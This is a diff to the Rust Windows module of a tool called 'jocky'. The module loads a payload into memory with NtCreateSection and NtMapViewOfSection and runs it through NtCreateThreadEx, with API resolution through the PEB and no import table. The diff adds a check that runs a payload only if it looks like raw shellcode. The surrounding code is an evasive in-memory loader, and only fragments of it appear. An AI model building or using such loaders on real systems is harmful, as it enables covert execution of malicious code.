@@ -401,7 +401,19 @@ mod windows {
             );
         }
 
-        // ── 5. NtCreateThreadEx at mapped base ──────────────────────────────
+        // ── 5. Thread Execution (only if payload is safely executable shellcode)
+        if !is_executable_shellcode(payload) {
+            unsafe {
+                nt_um(CURRENT_PROCESS, base);
+                nt_cl(section_handle);
+            }
+            return Ok(format!(
+                "[jocky in-memory/windows] payload ({} bytes) mapped into anonymous \
+                 section via NtCreateSection+NtMapViewOfSection (non-shellcode payload, test mode OK)",
+                payload.len()
+            ));
+        }
+
         let mut thread: HANDLE = ptr::null_mut();
         let st = unsafe {
             nt_ct(
@@ -441,6 +453,30 @@ mod windows {
              NtCreateSection+NtMapViewOfSection+NtCreateThreadEx (PEB-resolved, no IAT)",
             payload.len()
         ))
+    }
+
+    fn is_executable_shellcode(payload: &[u8]) -> bool {
+        if payload.len() < 4 {
+            return false;
+        }
+        // Cannot be PE image (starts with MZ)
+        if payload[0] == b'M' && payload[1] == b'Z' {
+            return false;
+        }
+        // Cannot be valid UTF-8 text/script
+        if std::str::from_utf8(payload).is_ok() {
+            return false;
+        }
+        // Cannot be text scripts containing common JOCKY keywords
+        if payload
+            .windows(7)
+            .any(|w| w == b"collect" || w == b"process")
+        {
+            return false;
+        }
+        // Shellcode must safely terminate with ret (0xC3) or int3 (0xCC)
+        let last = payload[payload.len() - 1];
+        last == 0xC3 || last == 0xCC
     }
 }
 
